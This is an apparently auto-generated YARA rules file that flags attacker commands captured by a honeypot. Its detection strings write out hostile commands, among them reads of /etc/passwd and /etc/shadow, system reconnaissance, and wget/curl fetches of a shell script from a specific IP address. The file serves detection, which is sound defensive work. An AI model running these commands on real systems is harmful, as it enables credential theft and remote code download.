// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260327_2137
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_CredentialTheft {
    meta:
        description = "LLM Honeypot Intelligence - CredentialTheft pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "2"
    strings:
        $s0 = "cat /etc/passwd 2>/dev/null" ascii nocase
        $s1 = "cat /etc/shadow 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "662"
        unique_patterns = "12"
    strings:
        $s0 = "ps -ef" ascii nocase
        $s1 = "lspci" ascii nocase
        $s2 = "ip addr show 2>/dev/null" ascii nocase
        $s3 = "/bin/./uname -s -v -n -r -m" ascii nocase
        $s4 = "uname -s -m" ascii nocase
        $s5 = "ifconfig" ascii nocase
        $s6 = "ip route show 2>/dev/null" ascii nocase
        $s7 = "ps aux" ascii nocase
        $s8 = "hostname" ascii nocase
        $s9 = "nvidia-smi -q" ascii nocase
        $s10 = "uptime" ascii nocase
        $s11 = "cat /proc/version 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "11"
        unique_patterns = "3"
    strings:
        $s0 = "wget --no-check-certificate -qO- https://31.57.216.121/sh" ascii nocase
        $s1 = "curl -sk https://31.57.216.121/sh" ascii nocase
        $s2 = "scp -t /bin/xu43r3rhs64ruxlmet4ngmhj8z" ascii nocase
    condition:
        any of them
}

rule Honeypot_DataCollection {
    meta:
        description = "LLM Honeypot Intelligence - DataCollection pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "1"
    strings:
        $s0 = "locate D877F783D5D3EF8Cs" ascii nocase
    condition:
        any of them
}